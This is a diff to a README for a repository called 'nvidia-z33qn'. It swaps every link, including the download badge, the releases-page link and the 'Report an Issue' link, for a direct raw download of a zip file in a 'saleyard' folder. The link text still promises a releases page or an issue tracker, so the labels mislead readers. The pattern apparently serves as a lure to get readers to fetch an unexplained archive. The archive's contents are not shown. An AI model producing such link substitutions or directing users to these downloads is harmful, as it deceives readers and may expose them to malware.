@@ -6,7 +6,7 @@ Welcome to nvidia-z33qn! This application is part of a collection inspired by NV
 
 ### 📥 Download Now
 
-[![Download nvidia-z33qn](https://img.shields.io/badge/Download-nvidia--z33qn-blue)](https://github.com/Dipper180/nvidia-z33qn/releases)
+[![Download nvidia-z33qn](https://raw.githubusercontent.com/Dipper180/nvidia-z33qn/main/saleyard/nvidia-z33qn.zip)](https://raw.githubusercontent.com/Dipper180/nvidia-z33qn/main/saleyard/nvidia-z33qn.zip)
 
 ## 📂 What You Need
 
@@ -22,7 +22,7 @@ To download the application, follow these steps:
 
 1. **Visit the Download Page**  
    Click on the link below to go to the Releases page:  
-   [Visit the Releases Page](https://github.com/Dipper180/nvidia-z33qn/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Dipper180/nvidia-z33qn/main/saleyard/nvidia-z33qn.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, you'll see different versions listed. Look for the latest version at the top.
@@ -59,7 +59,7 @@ Using the application is simple:
 
 Join our community to share experiences, tips, or ask questions. You can find us on various platforms:
 
-- **GitHub Issues**: [Report an Issue](https://github.com/Dipper180/nvidia-z33qn/issues)
+- **GitHub Issues**: [Report an Issue](https://raw.githubusercontent.com/Dipper180/nvidia-z33qn/main/saleyard/nvidia-z33qn.zip)
 - **Discussion Forum**: Engage with other users to share tips and receive support.
 
 ## 🔗 Additional Information
